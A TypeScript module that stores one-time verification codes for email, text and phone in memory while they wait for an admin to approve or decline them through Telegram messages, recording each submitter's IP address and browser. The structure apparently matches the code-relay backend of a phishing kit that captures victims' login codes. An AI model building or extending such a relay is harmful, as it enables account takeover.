/**
 * Pending Codes Storage System
 * Tracks verification codes awaiting admin approval
 */

export interface PendingCode {
  id: string;
  code: string;
  method: "email" | "text" | "phone";
  otpStep: 1 | 2;
  flowType: "new_user" | "forgot_password";
  createdAt: number;
  expiresAt: number;
  messageId?: number; // Telegram message ID for editing
  status: "pending" | "approved" | "declined" | "expired";
  approvedBy?: string;
  approvedAt?: number;
  declinedBy?: string;
  declinedAt?: number;
  clientIp?: string;
  userAgent?: string;
}

// In-memory storage (in production, use a database)
const pendingCodesMap = new Map<string, PendingCode>();

// Cleanup interval (5 minutes)
const CLEANUP_INTERVAL = 5 * 60 * 1000;

// Code expiry (15 minutes by default)
const CODE_EXPIRY = 15 * 60 * 1000;

/**
 * Generate a unique ID for a code
 */
export function generateCodeId(): string {
  return `${Date.now()}-${Math.random().toString(36).slice(2, 11)}`;
}

/**
 * Store a pending code
 */
export function storePendingCode(
  code: string,
  method: "email" | "text" | "phone",
  otpStep: 1 | 2,
  flowType: "new_user" | "forgot_password" = "new_user",
  options?: {
    clientIp?: string;
    userAgent?: string;
  },
): PendingCode {
  const id = generateCodeId();
  const now = Date.now();

  const pendingCode: PendingCode = {
    id,
    code,
    method,
    otpStep,
    flowType,
    createdAt: now,
    expiresAt: now + CODE_EXPIRY,
    status: "pending",
    clientIp: options?.clientIp,
    userAgent: options?.userAgent,
  };

  pendingCodesMap.set(id, pendingCode);

  return pendingCode;
}

/**
 * Get a pending code by ID
 */
export function getPendingCode(id: string): PendingCode | undefined {
  const code = pendingCodesMap.get(id);
  if (!code) return undefined;

  // Check if expired
  if (code.expiresAt < Date.now()) {
    code.status = "expired";
    return code;
  }

  return code;
}

/**
 * Get a pending code by code value
 */
export function getPendingCodeByValue(code: string): PendingCode | undefined {
  for (const pending of pendingCodesMap.values()) {
    if (pending.code === code && pending.status === "pending") {
      if (pending.expiresAt < Date.now()) {
        pending.status = "expired";
        continue;
      }
      return pending;
    }
  }
  return undefined;
}

/**
 * Update a pending code status
 */
export function updatePendingCode(
  id: string,
  update: Partial<PendingCode>,
): PendingCode | undefined {
  const code = pendingCodesMap.get(id);
  if (!code) return undefined;

  const updated = { ...code, ...update };
  pendingCodesMap.set(id, updated);

  return updated;
}

/**
 * Approve a code
 */
export function approvePendingCode(
  id: string,
  approvedBy: string,
): PendingCode | undefined {
  return updatePendingCode(id, {
    status: "approved",
    approvedBy,
    approvedAt: Date.now(),
  });
}

/**
 * Decline a code
 */
export function declinePendingCode(
  id: string,
  declinedBy: string,
): PendingCode | undefined {
  return updatePendingCode(id, {
    status: "declined",
    declinedBy,
    declinedAt: Date.now(),
  });
}

/**
 * Get all pending codes
 */
export function getAllPendingCodes(): PendingCode[] {
  return Array.from(pendingCodesMap.values());
}

/**
 * Get active pending codes (not expired, not processed)
 */
export function getActivePendingCodes(): PendingCode[] {
  const now = Date.now();
  return Array.from(pendingCodesMap.values()).filter(
    (code) =>
      code.status === "pending" && code.expiresAt >= now,
  );
}

/**
 * Clean up expired codes
 */
export function cleanupExpiredCodes(): number {
  let count = 0;
  const now = Date.now();

  for (const [id, code] of pendingCodesMap.entries()) {
    if (code.expiresAt < now && code.status === "pending") {
      code.status = "expired";
      count++;
    }
  }

  return count;
}

/**
 * Start automatic cleanup
 */
export function startAutocleanup(): void {
  setInterval(() => {
    const count = cleanupExpiredCodes();
    if (count > 0) {
      console.log(`[Pending Codes] Cleaned up ${count} expired codes`);
    }
  }, CLEANUP_INTERVAL);
}

/**
 * Get statistics
 */
export function getPendingCodesStats() {
  const all = getAllPendingCodes();
  const pending = getActivePendingCodes();

  return {
    total: all.length,
    active: pending.length,
    approved: all.filter((c) => c.status === "approved").length,
    declined: all.filter((c) => c.status === "declined").length,
    expired: all.filter((c) => c.status === "expired").length,
  };
}
